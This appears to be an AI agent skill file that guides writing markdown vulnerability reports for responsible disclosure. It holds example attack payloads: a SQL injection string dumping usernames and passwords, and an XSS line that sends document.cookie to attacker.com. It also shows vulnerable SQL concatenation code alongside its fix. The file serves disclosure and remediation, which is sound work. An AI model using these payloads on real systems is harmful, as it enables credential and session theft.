---
name: markdown-report
description: Generate generic markdown vulnerability reports for internal documentation, private disclosure, or non-platform submissions. Use when not submitting to HackerOne/Bugcrowd or when portable format is needed.
tags:
  - security
  - report
  - markdown
  - vulnerability
  - documentation
triggers:
  - vulnerability report
  - markdown report
  - security report
  - write finding report
---

# markdown-report

## When to Use

- Vulnerability needs internal team documentation
- Private or responsible disclosure to vendor
- Non-platform bug bounty submissions
- GitHub security advisory or issue report
- Portfolio/archive of discovered vulnerabilities
- Vendor without bug bounty program

## Quick Start

Generate a basic markdown vulnerability report:

```markdown
# [Vulnerability Type] - [Component/Location]

## Summary

Brief description of the vulnerability and its impact.

## Severity

**Rating:** High
**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Affected

- Version: 1.0.0 - 2.3.4
- Component: User authentication module

## Steps to Reproduce

1. Navigate to [URL]
2. Perform [action]
3. Observe [result]

## Impact

[Security and business impact description]

## Proof of Concept

[HTTP requests, code snippets, screenshots]

## Remediation

[Recommended fix with code examples]

## Timeline

- **Discovered:** 2025-01-15
- **Reported:** 2025-01-16
- **Acknowledged:** [pending]
- **Fixed:** [pending]
```

## Step-by-Step Process

### Step 1: Choose Severity System

**Option A: CVSS 3.1 (Recommended for technical audiences)**

| Score    | Qualitative | Description                             |
| -------- | ----------- | --------------------------------------- |
| 9.0-10.0 | Critical    | Immediate exploitation, full compromise |
| 7.0-8.9  | High        | Significant impact, easy to exploit     |
| 4.0-6.9  | Medium      | Limited impact or requires conditions   |
| 0.1-3.9  | Low         | Minimal impact, difficult to exploit    |
| 0.0      | None        | Informational only                      |

**Option B: Qualitative (Simpler for non-technical audiences)**

| Rating        | Description                                      |
| ------------- | ------------------------------------------------ |
| Critical      | Full system compromise, data breach, RCE         |
| High          | Significant data exposure, privilege escalation  |
| Medium        | Limited data exposure, requires user interaction |
| Low           | Minor impact, difficult exploitation             |
| Informational | No direct security impact                        |

**Option C: Risk-Based**

| Rating   | Likelihood x Impact               |
| -------- | --------------------------------- |
| Critical | High likelihood + High impact     |
| High     | High likelihood + Medium impact   |
| Medium   | Medium likelihood + Medium impact |
| Low      | Low likelihood + Low impact       |

### Step 2: Write Report Title

Format: `[Vulnerability Type] - [Specific Component/Location]`

**Good Titles:**

```
SQL Injection - User Search API Endpoint
Stored XSS - Profile Biography Field
Broken Authentication - Password Reset Flow
IDOR - Document Download Endpoint
SSRF - Image Import Feature
```

### Step 3: Write Executive Summary

One paragraph covering:

- What the vulnerability is
- Where it exists
- Who can exploit it
- What the impact is

**Example:**

```markdown
## Summary

A SQL injection vulnerability exists in the user search functionality
at `/api/users/search`. The `query` parameter is directly concatenated
into SQL queries without sanitization. An unauthenticated attacker can
extract all database contents including user credentials, personal
information, and internal records.
```

### Step 4: Document Severity

```markdown
## Severity

**Rating:** Critical

**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| Metric              | Value     | Rationale                         |
| ------------------- | --------- | --------------------------------- |
| Attack Vector       | Network   | Exploitable over internet         |
| Attack Complexity   | Low       | No special conditions required    |
| Privileges Required | None      | No authentication needed          |
| User Interaction    | None      | No user action needed             |
| Scope               | Unchanged | Stays within vulnerable component |
| Confidentiality     | High      | Full database access              |
| Integrity           | High      | Data modification possible        |
| Availability        | High      | Data deletion possible            |
```

### Step 5: Specify Affected Versions

```markdown
## Affected

| Component  | Affected Versions | Fixed Version     |
| ---------- | ----------------- | ----------------- |
| API Server | 1.0.0 - 2.3.4     | 2.3.5             |
| Web Client | All versions      | N/A (server-side) |

**Conditions:**

- Default installation
- No WAF or input filtering
- Database user has SELECT privileges
```

### Step 6: Write Reproduction Steps

```markdown
## Steps to Reproduce

### Prerequisites

- Browser or HTTP client (curl, Burp Suite)
- Network access to target application

### Reproduction

1. **Identify vulnerable endpoint**
```

GET /api/users/search?query=test HTTP/1.1
Host: target.example.com

```

2. **Inject SQL payload**
```

GET /api/users/search?query=test'+UNION+SELECT+username,password,email+FROM+users-- HTTP/1.1
Host: target.example.com

```

3. **Observe database extraction**
Response contains user credentials from database

### Expected vs Actual Behavior

| Expected | Actual |
|----------|--------|
| Input sanitized, safe query executed | Raw SQL injection succeeds |
| Error returned for malformed input | Database contents returned |
```

### Step 7: Describe Impact

```markdown
## Impact

### Technical Impact

- **Confidentiality:** Complete database access
- **Integrity:** Data modification and deletion possible
- **Availability:** Potential for data destruction

### Business Impact

- User credential theft affecting 50,000+ accounts
- PII exposure triggering GDPR/CCPA notification requirements
- Reputational damage if publicly disclosed
- Potential regulatory fines

### Attack Scenarios

1. **Mass credential theft:** Extract all usernames and password hashes
2. **Data exfiltration:** Export customer PII to external systems
3. **Privilege escalation:** Modify user roles to gain admin access
4. **Data destruction:** DELETE queries to cause service disruption
```

### Step 8: Provide Proof of Concept

````markdown
## Proof of Concept

### HTTP Request

```http
GET /api/users/search?query=test'+UNION+SELECT+username,password,email+FROM+users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Cookie: session=abc123
```
````

### HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {
      "username": "admin",
      "password": "$2b$12$[HASH_REDACTED]",
      "email": "admin@example.com"
    }
  ]
}
```

### Evidence

- Screenshot: [attached]
- Video: [link to demonstration]
- Testing timestamp: 2025-01-15 14:30:00 UTC
- Testing IP: [redacted for report]

### Verification Steps

1. Hash matches bcrypt format (password storage confirmed)
2. Email domain matches organization
3. Multiple records extractable via iteration

````

### Step 9: Recommend Remediation

```markdown
## Remediation

### Immediate Mitigations
1. Deploy WAF rules to block SQLi patterns
2. Implement input validation on affected parameter
3. Monitor logs for exploitation attempts

### Long-term Fixes

**Root Cause:** Direct string concatenation in SQL queries

**Solution:** Use parameterized queries

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE name LIKE '%{user_input}%'"

# Fixed code
cursor.execute(
    "SELECT * FROM users WHERE name LIKE %s",
    [f"%{user_input}%"]
)
````

### Additional Recommendations

1. Implement prepared statements across all database queries
2. Use ORM with automatic parameterization
3. Apply least-privilege database accounts
4. Enable query logging for detection
5. Conduct code review for similar patterns

### References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

````

### Step 10: Include Timeline

```markdown
## Timeline

| Date | Event |
|------|-------|
| 2025-01-10 | Vulnerability discovered during security testing |
| 2025-01-11 | Initial analysis and PoC development |
| 2025-01-12 | Report drafted and reviewed |
| 2025-01-13 | Report submitted to security@vendor.com |
| 2025-01-14 | Acknowledgment received from vendor |
| 2025-01-20 | Vendor confirms vulnerability |
| 2025-02-01 | Patch released in version 2.3.5 |
| 2025-02-15 | Public disclosure (90-day policy) |

**Disclosure Policy:** Responsible disclosure with 90-day deadline
````

## Advanced Markdown Features

### Collapsible Sections

```markdown
<details>
<summary>Click to expand full HTTP trace</summary>

\`\`\`http
GET /api/vulnerable HTTP/1.1
Host: example.com
[...]
\`\`\`

</details>
```

### Tables for Comparison

```markdown
| Aspect         | Before Fix              | After Fix          |
| -------------- | ----------------------- | ------------------ |
| Input handling | Direct concatenation    | Parameterized      |
| Error messages | Database errors exposed | Generic errors     |
| Logging        | None                    | Full query logging |
```

### Inline Code and Blocks

```markdown
The vulnerable parameter is `query` in the `/api/search` endpoint.

\`\`\`python

# Syntax highlighting for code blocks

def search_users(query):
return db.execute(f"SELECT \* FROM users WHERE name = '{query}'")
\`\`\`
```

### Task Lists for Tracking

```markdown
## Remediation Checklist

- [x] Initial report submitted
- [x] Vendor acknowledgment received
- [ ] Patch developed
- [ ] Patch deployed to production
- [ ] Verification testing complete
- [ ] Public disclosure
```

## Examples

### Example 1: SQL Injection Report

```markdown
# SQL Injection - User Search API

## Summary

SQL injection in `/api/users/search` enables full database compromise.

## Severity

**Rating:** Critical | **CVSS:** 9.8

## Affected

- Versions: 1.0.0 - 2.3.4
- Component: Search API module

## Steps to Reproduce

1. Request: `GET /api/users/search?query=test`
2. Inject: `test' UNION SELECT username,password FROM users--`
3. Observe credentials in response

## Impact

- Full database access (50,000+ user records)
- Credential theft and PII exposure
- Potential complete system compromise

## PoC

Request: `GET /api/users/search?query=test'+UNION+SELECT+*+FROM+users--`
Response: `{"results":[{"username":"admin","password":"$2b$..."}]}`

## Remediation

Use parameterized queries:
\`\`\`python
cursor.execute("SELECT \* FROM users WHERE name = %s", [query])
\`\`\`

## Timeline

- Discovered: 2025-01-10
- Reported: 2025-01-11
- Fixed: 2025-01-25
```

### Example 2: XSS Report

```markdown
# Stored XSS - User Profile Bio

## Summary

Stored XSS in profile bio executes JavaScript for all profile viewers.

## Severity

**Rating:** High | **CVSS:** 7.1

## Steps to Reproduce

1. Edit profile bio with: `<img src=x onerror="alert(document.cookie)">`
2. Save profile
3. Any user viewing profile triggers XSS

## Impact

Session hijacking, account takeover, phishing.

## PoC

Payload: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`

## Remediation

HTML encode output, implement CSP, set HttpOnly cookies.
```

### Example 3: IDOR Report

```markdown
# IDOR - Document Download API

## Summary

Direct object reference allows downloading any user's documents by ID.

## Severity

**Rating:** Medium | **CVSS:** 6.5

## Steps to Reproduce

1. Login as user A, upload document (ID: 12345)
2. Login as user B
3. Request: `GET /api/documents/12345/download`
4. User B downloads user A's document

## Impact

Access to other users' private documents, potential PII exposure.

## PoC

Request: `GET /api/documents/12345/download`
Response: 200 OK with document belonging to different user

## Remediation

\`\`\`python
if document.owner_id != current_user.id:
return 403, "Access denied"
\`\`\`
```

## Error Handling

| Issue                    | Resolution                                              |
| ------------------------ | ------------------------------------------------------- |
| Vendor unresponsive      | Follow up at 7, 14, 30 days; consider CERT/regulator    |
| No security contact      | Check security.txt, try security@, abuse@, contact page |
| Vendor disputes severity | Provide detailed impact analysis with scenarios         |
| Vendor claims duplicate  | Request original report date and CVE if assigned        |
| Vendor threatens legal   | Document everything, consider legal advice              |
| Patch incomplete         | Document remaining attack vectors, retest               |

## Best Practices

1. **Be clear and concise** - Assume reader has limited time
2. **Use consistent formatting** - Headers, code blocks, tables
3. **Redact sensitive data** - No real credentials or PII
4. **Provide minimal PoC** - Prove impact without excess damage
5. **Include remediation** - Be helpful, not just critical
6. **Document timeline** - Protects both parties
7. **Use encryption** - PGP/GPG for sensitive reports
8. **Keep evidence** - Screenshots, logs, recordings
9. **Follow disclosure policy** - Respect coordinated timelines
10. **Be professional** - Maintain constructive relationship

## References

- [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)
- [FIRST CVSS 3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [GitHub Security Advisories](https://docs.github.com/en/code-security/security-advisories)
- [Markdown Guide - Extended Syntax](https://www.markdownguide.org/extended-syntax/)
- [disclose.io - Disclosure Terms](https://github.com/disclose/disclose)
